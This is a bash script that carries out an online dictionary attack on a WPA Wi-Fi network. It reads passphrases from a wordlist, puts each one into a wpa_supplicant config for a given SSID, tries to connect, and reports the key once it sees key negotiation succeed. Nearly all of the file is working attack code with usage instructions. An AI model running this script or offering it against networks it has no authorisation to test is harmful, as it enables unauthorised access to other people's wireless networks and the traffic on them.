#!/bin/bash

# Validate command line arguments
if [[ $# -ne 3 ]]; then
    printf "Usage: %s <interface> <ssid> <wordlist-file>\n", $0
    exit 1
fi

# Variables
interface=$1
ssid=$2
wordlist=$3
TEMP_FILE=online_attack_temp.conf
OUTPUT_LOG=wpa_supplicant_temp.log
SUCCESS_STR="Key negotiation completed"

# Make sure interface is up
ip link set $interface up

# Keep making guesses until the passphrase is discovered
while IFS= read -r passphrase
do
    # Remove trailing carriage return/newline
    passphrase=${passphrase//$'\r'/}
    passphrase=${passphrase//$'\n'/}

    # Generate conf file
    cat TEMPLATE.conf | sed "s/TEMPLATE_SSID/$ssid/" | \
        sed "s/TEMPLATE_SHARED_KEY/$passphrase/" > $TEMP_FILE

    # Make connection
    wpa_supplicant -B -i $interface -c $TEMP_FILE -f $OUTPUT_LOG

    # Wait for wpa_supplicant to succeed/fail and stop it
    timeout 1 ping 8.8.8.8 > /dev/null
    killall wpa_supplicant

    # Determine success/fail
    log=$(cat $OUTPUT_LOG)
    if [[ "$log" == *"$SUCCESS_STR"* ]]; then
        echo Key found: $passphrase
        break
    fi
done < "$wordlist"

# Clean up
rm $TEMP_FILE $OUTPUT_LOG